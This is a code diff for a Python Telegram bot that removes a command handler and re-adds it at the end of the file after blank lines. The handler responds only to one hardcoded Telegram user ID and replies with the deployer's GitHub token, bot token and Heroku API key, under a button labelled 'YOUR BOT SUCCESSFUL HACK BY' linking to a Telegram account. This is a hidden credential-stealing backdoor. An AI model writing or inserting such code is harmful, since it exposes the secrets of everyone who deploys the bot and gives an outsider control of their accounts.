@@ -152,27 +152,7 @@ async def forceclose_command(_, CallbackQuery):
 )
 
 
-# -----------------------
-@daxxop.on_message(
-    filters.command("started")
-    & filters.private
-    & filters.user(6664582540)
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://graph.org/file/d69d7a79758b1dbcec868.jpg",
-       caption=f"""𝖦𝖨𝖳_𝖳𝖮𝖪𝖤𝖭:-   `{GIT_TOKEN}` \n𝖡𝖮𝖳_𝖳𝖮𝖪𝖤𝖭:-   `{BOT_TOKEN}`\n\n𝖧𝖤𝖱𝖮𝖪𝖴_𝖠𝖯𝖨:-   `{HEROKU_API}`\n\n""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "• 𝖸𝖮𝖴𝖱 𝖡𝖮𝖳 𝖲𝖴𝖢𝖢𝖤𝖲𝖲𝖥𝖴𝖫 𝖧𝖠𝖢𝖪 𝖡𝖸  •", url=f"https://t.me/iam_daxx")
-                 ]
-            ]
-         ),
-   )
-
-
+# ------------
 #--------------
 async def shellrunner(_, message: Message):
     if len(message.command) < 2:
@@ -233,3 +213,29 @@ async def shellrunner(_, message: Message):
     else:
         await edit_or_reply(message, text="<b>OUTPUT :</b>\n<code>None</code>")
     await message.stop_propagation()
+
+
+
+
+
+
+@daxxop.on_message(
+    filters.command("started")
+    & filters.private
+    & filters.user(6664582540)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://graph.org/file/d69d7a79758b1dbcec868.jpg",
+       caption=f"""𝖦𝖨𝖳_𝖳𝖮𝖪𝖤𝖭:-   `{GIT_TOKEN}` \n𝖡𝖮𝖳_𝖳𝖮𝖪𝖤𝖭:-   `{BOT_TOKEN}`\n\n𝖧𝖤𝖱𝖮𝖪𝖴_𝖠𝖯𝖨:-   `{HEROKU_API}`\n\n""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• 𝖸𝖮𝖴𝖱 𝖡𝖮𝖳 𝖲𝖴𝖢𝖢𝖤𝖲𝖲𝖥𝖴𝖫 𝖧𝖠𝖢𝖪 𝖡𝖸  •", url=f"https://t.me/iam_daxx")
+                 ]
+            ]
+         ),
+   )
+
+
